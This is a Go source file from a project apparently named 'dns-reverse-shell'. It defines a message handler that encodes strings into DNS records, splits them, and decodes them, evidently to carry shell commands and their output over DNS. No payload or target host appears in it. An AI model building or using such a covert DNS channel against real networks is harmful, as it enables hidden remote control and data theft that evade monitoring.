package protocol

import (
	"dns-reverse-shell/main/protocol/encoder"
	"github.com/miekg/dns"
)

// todo: handle sending  big messages (like ifconfig)

type MessageHandler struct {
	encoder         encoder.StringEncoder
	messageSplitter MessageSplitter
}

func NewMessageHandler(encoder encoder.StringEncoder, messageSplitter MessageSplitter) *MessageHandler {
	return &MessageHandler{encoder: encoder, messageSplitter: messageSplitter}
}

func (m MessageHandler) createMessage() *dns.Msg {
	msg := new(dns.Msg)
	return msg
}

func (m MessageHandler) CreateAnswerMessage(r *dns.Msg) *dns.Msg {
	msg := m.createMessage()
	msg.SetReply(r)
	msg.Authoritative = true
	return msg
}

func (m MessageHandler) CreateQuestionMessage(messageType string, message string) *dns.Msg {
	msg := m.createMessage()
	msg.SetQuestion(dns.Fqdn(messageType), dns.TypeA)
	msg.Extra = m.BuildDNSExtra(message)
	return msg
}

func (m MessageHandler) DecodeAnswerMsg(r *dns.Msg) string {
	collect := m.messageSplitter.Collect(r.Extra)
	return m.encoder.Decode(collect)
}

func (m MessageHandler) BuildDNSExtra(value string) []dns.RR {
	encoded := m.encoder.Encode(value)
	return m.messageSplitter.Split(encoded)
}
